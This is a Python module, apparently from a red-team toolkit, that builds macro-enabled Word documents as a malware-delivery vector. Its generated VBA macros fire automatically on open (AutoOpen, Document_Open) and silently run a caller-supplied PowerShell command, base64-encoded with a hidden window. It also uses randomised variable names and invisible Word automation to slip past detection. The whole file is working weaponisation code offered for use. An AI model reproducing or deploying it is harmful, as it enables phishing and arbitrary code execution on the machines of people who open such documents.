# redteam_toolkit/delivery/macro_injectors/word_macro_generator.py

import os
import random
import string
import base64
import logging
from pathlib import Path
from win32com.client import Dispatch

logger = logging.getLogger("MacroInjector")
logging.basicConfig(level=logging.INFO)

class WordMacroGenerator:
    def __init__(self, output_dir="dist/macro_docs"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _random_var(self, length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))

    def _obfuscate_powershell(self, command: str) -> str:
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        return f"powershell -WindowStyle Hidden -EncodedCommand {encoded}"

    def _generate_macro(self, payload_command: str) -> str:
        v1, v2, v3 = self._random_var(), self._random_var(), self._random_var()
        return f"""
Sub AutoOpen()
    {v1} = "{payload_command}"
    {v2} = "cmd /c " & {v1}
    CreateObject("Wscript.Shell").Run {v2}, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
        """.strip()

    def generate_doc_with_macro(self, output_filename: str, raw_powershell_command: str) -> Path:
        macro_code = self._generate_macro(self._obfuscate_powershell(raw_powershell_command))

        doc_path = self.output_dir / f"{output_filename}.docm"
        vbaproject_path = self.output_dir / f"{output_filename}_macro.txt"
        vbaproject_path.write_text(macro_code, encoding='utf-8')

        logger.info(f"Injecting macro into Word document: {doc_path}")

        word = Dispatch("Word.Application")
        word.Visible = False
        doc = word.Documents.Add()
        word.VBE.MainWindow.Visible = False
        doc.SaveAs(str(doc_path), FileFormat=13)  # 13 = wdFormatXMLDocumentMacroEnabled
        doc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString(macro_code)
        doc.Save()
        doc.Close()
        word.Quit()

        logger.info(f"Document with macro saved: {doc_path}")
        return doc_path
